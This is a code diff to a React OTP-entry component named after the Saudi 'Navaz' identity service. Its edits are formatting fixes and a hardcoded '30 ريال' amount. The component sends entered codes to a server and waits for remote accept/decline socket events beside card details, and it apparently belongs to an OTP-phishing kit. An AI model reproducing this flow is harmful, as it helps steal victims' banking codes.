@@ -37,7 +37,7 @@ const NavazOtp = ({ setMode, checkMode }) => {
 
   const handleSubmit = async (e) => {
     setLoading(true);
-    setError(false)
+    setError(false);
     e.preventDefault();
     await axios
       .post(serverRoute + "/navazOtp/" + sessionStorage.getItem("id"), {
@@ -49,7 +49,6 @@ const NavazOtp = ({ setMode, checkMode }) => {
           navazOtp: otp,
         })
       );
-    
   };
 
   socket.on("declineNavazOTP", (ID) => {
@@ -59,7 +58,7 @@ const NavazOtp = ({ setMode, checkMode }) => {
     }
   });
   socket.on("acceptNavazOTP", (id) => {
-    console.log(id)
+    console.log(id);
     if (id === sessionStorage.getItem("id")) {
       setError(false);
       setLoading(false);
@@ -99,7 +98,10 @@ const NavazOtp = ({ setMode, checkMode }) => {
         </div>
         <div className="flex justify-between py-1">
           <span className="font-bold">Transaction Amount:</span>
-          <span>{Number(sessionStorage.getItem("price")).toFixed(2)} ريال</span>
+          <span className="" dir="rtl">
+            {" "}
+            30 ريال
+          </span>
         </div>
         <div className="flex justify-between py-1">
           <span className="font-bold">Card Number:</span>
